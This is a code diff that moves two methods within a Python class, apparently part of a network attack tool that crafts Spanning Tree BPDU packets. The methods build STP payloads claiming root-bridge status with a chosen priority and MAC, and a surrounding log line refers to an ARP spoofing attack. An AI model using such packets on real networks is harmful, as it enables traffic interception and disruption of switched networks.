@@ -60,61 +60,6 @@ class BPDUPacket:
             )
             self.packet = self.create_packet()
 
-    def _create_payload(self):
-        """
-        Create STP payload as self.payload field
-
-        :return: None
-        """
-        protocol_type = b"\x00\x00\x02\x02"
-        flags = b"\x7e"
-        # Priority is equal to 8192
-        root_id = self._create_bridge_id(self.srcmac_str, self.priority)
-        path_cost = b"\x00" * 4
-        bridge_id = root_id
-        port_id = b"\x80\x01"
-        msg_age = b"\x00\x00"
-        max_age = b"\x14\x00"
-        hello = b"\x02\x00"
-        forward_delay = b"\x0f\x00"
-        vers_len = b"\x00"
-
-        return (
-            protocol_type
-            + flags
-            + root_id
-            + path_cost
-            + bridge_id
-            + port_id
-            + msg_age
-            + max_age
-            + hello
-            + forward_delay
-            + vers_len
-        )
-
-    def _create_bridge_id(self, mac, priority):
-        """
-        Create a STP Bridge ID
-
-        :mac: MAC address in aa:aa:aa:aa:aa:aa (or uppercase, or with '-')
-              format
-        :priority: STP priority
-        :return: bridgeID in HEX format
-        """
-        if not 0 <= priority <= 61440:
-            raise ValueError("Priority must be in range from 0 to 61440")
-        if priority % 4096 != 0:
-            raise ValueError("Priority must be divisible by 4096")
-
-        # 4096 -> 1000
-        converted_priority = hex(int(priority / 4096))[2] + "000"
-        str_bridge_id = converted_priority + mac.replace(":", "").replace(
-            "-", ""
-        )
-        _LOGGER.debug("Set Bridge ID %s", converted_priority + "." + mac)
-        return unhexlify(str_bridge_id.strip())
-
     def create_packet(self):
         """
         Create an actual BPDU packet as self.packet field
@@ -143,3 +88,56 @@ class BPDUPacket:
             except KeyboardInterrupt:
                 _LOGGER.warning("Stopping ARP spoofing attack")
                 break
+
+    def _create_bridge_id(self, mac, priority):
+        """
+        Create a STP Bridge ID
+
+        :mac: MAC address in aa:aa:aa:aa:aa:aa (or uppercase, or with '-')
+              format
+        :priority: STP priority
+        :return: bridgeID in HEX format
+        """
+        if not 0 <= priority <= 61440:
+            raise ValueError("Priority must be in range from 0 to 61440")
+        if priority % 4096 != 0:
+            raise ValueError("Priority must be divisible by 4096")
+
+        # 4096 -> 1000
+        converted_priority = hex(int(priority / 4096))[2] + "000"
+        str_bridge_id = converted_priority + mac.replace(":", "").replace(
+            "-", ""
+        )
+        _LOGGER.debug("Set Bridge ID %s", converted_priority + "." + mac)
+        return unhexlify(str_bridge_id.strip())
+
+    def _create_payload(self):
+        """
+        Return STP payload
+        """
+        protocol_type = b"\x00\x00\x02\x02"
+        flags = b"\x7e"
+        # Priority is equal to 8192
+        root_id = self._create_bridge_id(self.srcmac_str, self.priority)
+        path_cost = b"\x00" * 4
+        bridge_id = root_id
+        port_id = b"\x80\x01"
+        msg_age = b"\x00\x00"
+        max_age = b"\x14\x00"
+        hello = b"\x02\x00"
+        forward_delay = b"\x0f\x00"
+        vers_len = b"\x00"
+
+        return (
+            protocol_type
+            + flags
+            + root_id
+            + path_cost
+            + bridge_id
+            + port_id
+            + msg_age
+            + max_age
+            + hello
+            + forward_delay
+            + vers_len
+        )
